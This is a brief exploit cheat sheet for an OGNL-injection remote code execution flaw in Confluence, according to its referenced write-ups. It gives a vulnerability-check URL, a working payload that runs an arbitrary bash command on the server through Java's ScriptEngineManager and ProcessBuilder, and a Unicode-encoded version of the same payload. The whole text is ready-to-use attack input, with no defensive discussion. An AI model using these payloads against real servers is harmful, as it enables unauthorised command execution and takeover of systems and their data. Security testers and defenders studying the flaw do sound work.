### Check for vulnerability
```
https://<rhost>/pages/doenterpagevariables.action?queryString=aaaa\u0027%2b#{3*333}%2b\u0027bbb  
```

### Exploit
```
https://<rhost>/pages/doenterpagevariables.action?queryString=aaa'+ #{ ""["class"].forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var x=new java.lang.ProcessBuilder;x.command(['/bin/bash','-c','<command>']);x.start()"); } +  
```

### Exploit encoded
```
https://<rhost>/pages/doenterpagevariables.action?queryString=aaa\u0027%2b#{\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var x=new java.lang.ProcessBuilder;x.command([\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027'.<command>.'\u0027]);x.start()\u0022)}%2b\u0027  
```

### References:
* https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md  
* https://www.exploit-db.com/exploits/50243  

